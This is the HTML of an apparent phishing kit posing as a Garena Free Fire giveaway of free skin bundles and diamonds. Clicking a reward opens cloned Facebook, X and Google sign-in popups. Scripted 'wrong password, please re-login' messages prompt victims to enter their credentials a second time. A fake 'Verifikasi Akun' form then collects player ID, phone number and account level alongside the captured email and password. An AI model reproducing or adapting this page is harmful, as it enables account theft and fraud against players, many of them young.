                                          <a>� Bundle - Yuji Itadori�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/4.jpg" item-name="Bundle - Ryomen Sukuna" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/4.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Bundle - Ryomen Sukunanbsp</a>
                                          <a>� Bundle - Ryomen Sukuna�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/5.jpg" item-name="Bundle - Nobara Kugisaki" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/5.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Bundle - Nobara Kugisaki�</a>
                                          <a>� Bundle - Nobara Kugisaki�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/6.jpg" item-name="M1187 - Incendium Burst" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/6.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� M1187 - Incendium Burst�</a>
                                          <a>� M1187 - Incendium Burst�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/7.jpg" item-name="Topi Jerami" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/7.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Topi Jeramj�</a>
                                          <a>� Topi Jerami�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>                            
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/8.jpg" item-name="AK47 - Draco (Max)" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/8.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Ak47 - Draco (Max)�</a>
                                          <a>� AK47 - Draco (Max)�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <script>$(document).ready(function(){$('body').hide();})</script>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/9.jpg" item-name="M1887 - Rapper Underworld" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/9.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� M1887 - Rapper Underworld�</a>
                                          <a>� M1887 - Rapper Underworld�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/10.jpg" item-name="M1887 - One Punch Man" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/10.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� M1887 - One Punch Man�</a>
                                          <a>� M1887 - One Punch Man�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/diamond.jpg" item-name="Diamond" item-total="5.000" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/diamond.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">-FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Diamond - 5.000�</a>
                                          <a>� Diamond - 5.000�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/diamond.jpg" item-name="Diamond" item-total="2.500" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/diamond.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Diamond - 2.500�</a>
                                          <a>� Diamond - 2.500�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                           </center>
                        </div>
                     </div>
                  </div>
                  <!--- box-item --->
               </div>
               <!--- box --->
            </div>
            <!--- container-box --->
         </div>
         <!--- laz-container --->
      </div>
      <!--- laz-home --->
      <div class="popup-login first-login-facebook animated fadeIn" style="display: none;">
         <div class="popup-box-login-fb">
            <a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
            <div class="navbar-fb">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/facebook-text.png">
            </div>
            <div class="content-box-fb">
               <p class="kaget first-email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
               <p class="kaget first-sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/icon_2.jpg">
               <div class="txt-login-fb">
                  Log in to your Facebook account to connect to Free Fire.
               </div>
               <form class="login-form" action="javascript:void(0)" method="post" id="FirstValidateLoginFbForm">
                  <div class="form-group-fb">
                     <input type="text" name="email" id="first-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" pattern="(^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$)|(^\d{10,15}$)" required"="">
                     <div class="form-group-sohid FirstShowFbPassword" onclick="FirstShowFbPassword()">
                        <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/Fgn-Show-Password.png">
                     </div>
                     <!--- form-group-sohid FirstShowFbPassword --->
                     <div class="form-group-sohid FirstHideFbPassword" style="display: none;" onclick="FirstHideFbPassword()">
                        <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/Fgn-Hide-Password.png">
                     </div>
                     <!--- form-group-sohid FirstHideFbPassword --->
                     <input type="password" name="password" id="first-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" minlength="6" required"="">
                  </div>
                  <!--- form-group-fb --->
                  <input type="hidden" name="login" id="first-login-facebook" value="Facebook" readonly="">
                  <button type="submit" class="btn-login-fb" onclick="FirstValidateLoginFbData()">Log In</button>
               </form>
               <div class="txt-create-account">Create Account</div>
               <div class="txt-not-now">Not now</div>
               <div class="txt-forgotten-password">Forgotten password?</div>
            </div>
            <div class="language-box">
               <center>
                  <div class="language-name language-name-active">English (UK)</div>
                  <div class="language-name">العربية</div>
                  <div class="language-name">Türkçe</div>
                  <div class="language-name">Tiếng Việt</div>
                  <div class="language-name">日本語</div>
                  <div class="language-name">Español</div>
                  <div class="language-name">Português (Brasil)</div>
                  <div class="language-name">
                     <i class="fa fa-plus"></i>
                  </div>
               </center>
            </div>
            <div class="copyright">Meta © 2026</div>
         </div>
         <!--- popup-box-login-fb --->
      </div>
      <!--- popup-login--->
      <div class="popup-login first-login-twitter animated fadeIn" style="display: none;">
         <div class="popup-box-login-twitter">
            <a onmousedown="tutup.play();" onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
            <div class="header-twitter"><img src=""></div>
            <!--- header-twitter --->
            <div class="txt-login-twitter">Sign in to X</div>
            <!--- txt-login-twitter --->
            <div class="content-box-twitter">
               <form action="javascript:void(0)" method="post" id="FirstValidateLoginTwitterForm">
                  <div class="form-group-twitter">
                     <input type="text" name="email" id="first-email-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Username, Email or Mobile number')" oninput="setCustomValidity('')">
                     <label>@Username</label>
                  </div>
                  <!--- form-group-twitter --->
                  <div class="form-group-twitter">
                     <div class="form-group-sohi FirstShowTwitterPassword" onclick="FirstShowTwitterPassword()">
                        <img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
                     </div>
                     <!--- form-group-sohi FirstShowTwitterPassword --->
                     <div class="form-group-sohi FirstHideTwitterPassword" style="display: none;" onclick="FirstHideTwitterPassword()">
                        <img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
                     </div>
                     <!--- form-group-sohi FirstHideTwitterPassword --->
                     <input type="password" name="password" id="first-password-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
                     <label>Password</label>
                  </div>
                  <!--- form-group-twitter --->
                  <p class="kagettw first-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px;">Sorry, we couldn't find your account.</p>
                  <p class="kagettw first-sandi-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Password!</p>
                  <input type="hidden" name="login" id="first-login-twitter" value="Twitter" readonly="">
                  <button type="submit" onclick="FirstValidateLoginTwitterData()">Log in</button>
                  <buttonx type="button">Forgot password?</buttonx>
                  <label>Don't have an account? <a>Sign up</a></label>
               </form>
            </div>
            <!--- content-box-twitter --->
         </div>
         <!--- popup-box-login-twitter --->
      </div>
      <!--- popup-login --->
      <div class="popup-login second-login-facebook animated fadeIn" style="display: none;">
         <div class="popup-box-login-fb">
            <div class="navbar-fb">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/facebook-text.png">
            </div>
            <div class="content-box-fb">
               <p class="kaget wrong-email-fb" style="width: 320px; top: -5px; text-align: left; display: block;">Your password was wrong. <b>Please re-login using the correct password.</b></p>
               <p class="kaget second-email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
               <p class="kaget second-sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/icon_2.jpg">
               <div class="txt-login-fb">
                  Log in to your Facebook account to connect to Free Fire.
               </div>
               <form class="login-form" action="javascript:void(0)" method="post" id="SecondValidateLoginFbForm">
                  <div class="form-group-fb">
                     <input type="text" name="email" id="second-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Enter Mobile number or email address')" pattern="(^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$)|(^\d{10,15}$)" roninput="setCustomValidity('')">
                     <div class="form-group-sohid SecondShowFbPassword" onclick="SecondShowFbPassword()">
                        <img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
                     </div>
                     <!--- form-group-sohid SecondShowFbPassword --->
                     <div class="form-group-sohid SecondHideFbPassword" style="display: none;" onclick="SecondHideFbPassword()">
                        <img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
                     </div>
                     <!--- form-group-sohid SecondHideFbPassword --->
                     <input type="password" name="password" id="second-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Enter Password')" minlength="5" oninput="setCustomValidity('')">
                  </div>
                  <!--- form-group-fb --->
                  <input type="hidden" name="login" id="second-login-facebook" value="Facebook" readonly="">
                  <button type="submit" class="btn-login-fb" onclick="SecondValidateLoginFbData()">Log In</button>
               </form>
               <div class="txt-create-account">Create Account</div>
               <div class="txt-not-now">Not now</div>
               <div class="txt-forgotten-password">Forgotten password?</div>
            </div>
            <div class="language-box">
               <center>
                  <div class="language-name language-name-active">English (UK)</div>
                  <div class="language-name">العربية</div>
                  <div class="language-name">Türkçe</div>
                  <div class="language-name">Tiếng Việt</div>
                  <div class="language-name">日本語</div>
                  <div class="language-name">Español</div>
                  <div class="language-name">Português (Brasil)</div>
                  <div class="language-name">
                     <i class="fa fa-plus"></i>
                  </div>
               </center>
            </div>
            <div class="copyright">Meta © 2026</div>
         </div>
         <!--- popup-box-login-fb --->
      </div>
      <!--- popup-login--->
      <div class="popup-login second-login-twitter animated fadeIn" style="display: none;">
         <div class="popup-box-login-twitter">
            <div class="header-twitter"><img src=""></div>
            <!--- header-twitter --->
            <div class="txt-login-twitter">Sign in to X</div>
            <!--- txt-login-twitter --->
            <div class="content-box-twitter">
               <form action="javascript:void(0)" method="post" id="SecondValidateLoginTwitterForm">
                  <div class="form-group-twitter">
                     <input type="text" name="email" id="second-email-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Username, Email or Mobile number')" oninput="setCustomValidity('')">
                     <label>@Username</label>
                  </div>
                  <!--- form-group-twitter --->
                  <div class="form-group-twitter">
                     <div class="form-group-sohi SecondShowTwitterPassword" onclick="SecondShowTwitterPassword()">
                        <img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
                     </div>
                     <!--- form-group-sohi SecondShowTwitterPassword --->
                     <div class="form-group-sohi SecondHideTwitterPassword" style="display: none;" onclick="SecondHideTwitterPassword()">
                        <img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
                     </div>
                     <!--- form-group-sohi SecondHideTwitterPassword --->
                     <input type="password" name="password" id="second-password-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
                     <label>Password</label>
                  </div>
                  <!--- form-group-twitter --->
                  <p class="kagettw wrong-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px; display: block;">Your password was wrong.<br>Please re-login using the correct password</p>
                  <p class="kagettw first-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px;">Sorry, we couldn't find your account.</p>
                  <p class="kagettw first-sandi-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Password!</p>
                  <input type="hidden" name="login" id="second-login-twitter" value="Twitter" readonly="">
                  <button type="submit" onclick="SecondValidateLoginTwitterData()">Log in</button>
                  <buttonx type="button">Forgot password?</buttonx>
                  <label>Don't have an account? <a>Sign up</a></label>
               </form>
            </div>
            <!--- content-box-twitter --->
         </div>
         <!--- popup-box-login-twitter --->
      </div>
      <!--- popup-login --->
      <div class="popup-login login-facebook-load" style="display: none;">
         <div class="popup-box-login-fb">
            <div class="navbar-fb">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/facebook-text.png">
            </div>
            <!--- navbar --->
            <div class="content-box-fb">
               <div class="fb-load">
                  <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/icon_fb.png">
                  <div class="loader3"></div>
               </div>
               <!--- fb-load --->
            </div>
            <!--- content-box-fb --->
         </div>
         <!--- popup-box-login-fb --->
      </div>
      <!--- popup-login--->
      <div class="popup-login login-twitter-load" style="display: none;">
         <div class="popup-box-login-twitter">
            <div class="twitter-load">
               <div class="twitter-load-title">
                  <div class="loader2"></div>
               </div>
               <!--- twitter-load-title --->
            </div>
            <!--- twitter-load --->
         </div>
         <!--- popup-box-login-twitter --->
      </div>
      <!--- popup-login --->
      <div class="popup account_verification animated fadeIn" style="display: none;">
         <div class="popup-box-wrapperz">
            <div class="popup-box-navbarz">
               <div class="popup-box-navbar-title">Verifikasi Akun</div>
            </div>
            <div class="popup-box-bgz">
               <div class="popup-box-alert4"><br>Lengkapi detail akun Garena Free Fire anda<br><br></div>
               <form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
                  <input type="hidden" name="email" id="validateEmail" readonly="">
                  <input type="hidden" name="password" id="validatePassword" readonly="">
                  <input type="number" name="playid" id="playid" placeholder="ID Pemain" autocomplete="off" required="" oninvalid="this.setCustomValidity('Masukkan ID Pemain Anda')" oninput="setCustomValidity('')">
                  <input type="number" name="phone" id="phone" placeholder="Nomer Ponsel" autocomplete="off" required="" oninvalid="this.setCustomValidity('Masukkan Nomer Ponsel Anda')" oninput="setCustomValidity('')">
                  <select name="level" id="level" required="" oninvalid="this.setCustomValidity('Pilih Tingkat Akun Anda')" oninput="setCustomValidity('')">
                     <option selected="selected" disabled="disabled" value="">Tingkat Akun</option>
                     <script>
                        for(var i = 1; i <= 100; i++){
                        	document.write("<option>" + i + "</option>");
                        };
                     </script><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option><option>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option><option>13</option><option>14</option><option>15</option><option>16</option><option>17</option><option>18</option><option>19</option><option>20</option><option>21</option><option>22</option><option>23</option><option>24</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option><option>32</option><option>33</option><option>34</option><option>35</option><option>36</option><option>37</option><option>38</option><option>39</option><option>40</option><option>41</option><option>42</option><option>43</option><option>44</option><option>45</option><option>46</option><option>47</option><option>48</option><option>49</option><option>50</option><option>51</option><option>52</option><option>53</option><option>54</option><option>55</option><option>56</option><option>57</option><option>58</option><option>59</option><option>60</option><option>61</option><option>62</option><option>63</option><option>64</option><option>65</option><option>66</option><option>67</option><option>68</option><option>69</option><option>70</option><option>71</option><option>72</option><option>73</option><option>74</option><option>75</option><option>76</option><option>77</option><option>78</option><option>79</option><option>80</option><option>81</option><option>82</option><option>83</option><option>84</option><option>85</option><option>86</option><option>87</option><option>88</option><option>89</option><option>90</option><option>91</option><option>92</option><option>93</option><option>94</option><option>95</option><option>96</option><option>97</option><option>98</option><option>99</option><option>100</option>
                  </select>
                  <input type="hidden" name="login" id="validateLogin" readonly="">
                  <br>
                  <br>
                  <div class="popup-box-form-footer">
                     <button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationDatax()" style="margin-top: -6px;">Verifikasi</button>
                  </div>
               </form>
            </div>
         </div>
      </div>
      <div class="popup check_verification animated fadeIn" style="display: none;">
         <div class="popup-box-wrapperz">
            <div class="popup-box-navbarz">
               <div class="popup-box-navbar-title">Memproses Akun</div>
            </div>
            <div class="popup-box-bgx">
               <div class="popup-box-alert8"><br>
                  <i class="fa-solid fa-circle-notch fa-spin" style="color: #737373;font-size: 50px;margin-bottom: 14px;"></i>
                  <br> Memproses Detail Akun Anda...
                  <br><br>
               </div>
               <div class="popup-box-footer"></div>
            </div>
         </div>
      </div>
      <div class="popup processing_account animated fadeIn" style="display: none;">
         <div class="popup-box-wrapperz">
            <div class="popup-box-navbarz">
               <div class="popup-box-navbar-title">Proses Penukaran</div>
            </div>
            <div class="popup-box-bgz">
               <div class="popup-box-alert3" style="padding-top: 7px;">
                  Hai Survivor<br>
                  <p>Penukaran hadiah anda sedang dalam proses. 
                     <br>Garena Free Fire juga akan memberi tahu Anda lewat 
                     In-Game Mail, Ketika Hadiah Berhasil Terkirim.
                     Dimohon untuk menunggu proses hingga 1-2 hari (48 Jam)
                     <br><br>Salam Booyah!
                  </p>
               </div>
               <div class="popup-box-alert0">
               </div>
               <div class="popup-box-footer">
                  <button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://ff.garena.com/id/';">Keluar</button>
               </div>
            </div>
         </div>
      </div>
      
      <div class="footer" style="top:-80px;">
         <img class="footer-copyright-icon" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/logo_1.png">
         <div class="footer-copyright-text">
            <div class="footer-txt-copyrights">
               Copyright © Garena International. Trademarks belong to their respective owners. All rights reserved.
            </div>
            <!--- footer-txt-copyrights --->
            <div class="footer-copyright-text-left">Privacy Policy</div>
            <!--- footer-txt-copyright --->
            <div class="footer-copyright-text-center">For Parents FAQ</div>
            <!--- footer-txt-copyright --->
            <div class="footer-copyright-text-right">Terms of Service</div>
            <!--- footer-txt-copyright --->
         </div>
         <!--- footer-copyright-text --->
      </div>
      <!--- footer --->
      <div class="popup open_rewards animated fadeIn" style="display: none;">
         <div class="popup-box-wrapper">
            <div class="popup-box-bg" style="height:220px;">
               <div class="popup-box-alert4"><br> </div>
               <!--- popup-box-alert --->
               <div class="popup-box-item">
                  <div>
                     <figure>
                        <img class="popup-item flip" src="">
                     </figure>
                  </div>
               </div>
               <!--- popup-box-item --->
               <br>
               <div class="popup-box-footer" style="margin-top:40px;">
                  <button type="button" onmousedown="buka.play();" onclick="get_token()">Collect</button>
               </div>
               <!--- popup-box-bg --->
            </div>
            <!--- popup-box-footer --->
         </div>
         <!--- popup-box-wrapper --->
      </div>
      <!--- popup open_rewards --->
      <div class="popup loadinglogin" style="display: none;">
         <div class="loadinglogin" style="width:400px;height: 679px;margin-top:279px;margin-left:auto;margin-right:auto;">
            <div class="loader-line"></div>
            <div class="loader-label" id="text-login1">Checking for updates...</div>
            <div class="loader-label" style="display:none" id="text-login2">Connecting to server...</div>
            <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/loadlogin.png" style="width: 100%; height: auto; object-fit: contain;">
            
         </div>
      </div>
      <div class="popup account_login animated fadeIn" style="display: none;">
         <div class="popup-box-wrapper"></div>
         <div class="loginpop">
            <div class="popup-box-alert-login"><br>
               <img class="popup-box-gamecon" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/logo.png" style="opacity:0%;">
            </div>
                        <button type="button" style="top:9px;" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa-brands fa-facebook"></i>Sign in dengan Facebook</button><br>
                        <div class="alter-text"><span>or</span></div>
                        <button type="button" style="top:-35px;" onmousedown="buka.play();" class="popup-btn-login popup-btn-google" onclick="open_google();">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/google_1.png">
               <g style="padding-right: 9px;">Sign in dengan Google</g>
            </button>
                     </div>
         <!--- popup-box-bg --->
      </div>
      <!--- popup-box-footer --->
      <div class="popup-login login-google animated fadeIn" style="display: none;">
         <div class="popup-box-login-google">
            <a onmousedown="tutup.play();" onclick="close_google()" class="close-other"><i class="fa-solid fa-xmark"></i></a>
            <div class="box-google">
               <div class="header-google">
                  <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
                     <g id="qaEJec">
                        <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                     </g>
                     <g id="YGlOvc">
                        <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                     </g>
                     <g id="BWfIk">
                        <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                     </g>
                     <g id="e6m3fd">
                        <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                     </g>
                     <g id="vbkDmc">
                        <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                     </g>
                     <g id="idEJde">
                        <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                     </g>
                  </svg>
               </div>
               <!--- header-google --->
               <div class="txt-login-google">Sign in</div>
               <!--- txt-login-google --->
               <div class="txt-login-google-desc">Use your Google account</div>
               <!--- txt-login-google-desc --->
               <form action="javascript:void(0)" method="post" id="ValidateLoginGoogleForm">
                  <div class="input-box">
                     <label class="input-label">Email or phone</label>
                     <input type="text" class="input-1" name="email" id="email-google" onfocus="setFocus(true)" onblur="setFocus(false)" pattern="(^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$)|(^\d{10,15}$)" required="">
                  </div>
                  <div class="input-box">
                     <label class="input-label">Password</label>
                     <input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true)" onblur="setFocus(false)" minlength="7" required="">
                  </div>
                  <input type="hidden" name="login" id="login-google" value="Google" readonly="">
<div class="email-google" style="color:#d50000;font-size:14px;text-align:left;display:none;align-items:center;">
   <span style="display:inline-flex;align-items:center;gap:6px;">
      <svg aria-hidden="true" fill="currentColor" focusable="false" width="16" height="16" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
      </svg>
      Couldn't find your Google account.
   </span>
</div>

<div class="sandi-google" style="color:#d50000;font-size:14px;text-align:left;display:none;align-items:center;">
   <span style="display:inline-flex;align-items:center;gap:6px;">
      <svg aria-hidden="true" fill="currentColor" focusable="false" width="16" height="16" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
      </svg>
      Wrong password, try again.
   </span>
</div>

                  <button type="button" class="btn-forgot-google">Forgot email?</button>
                  <br>
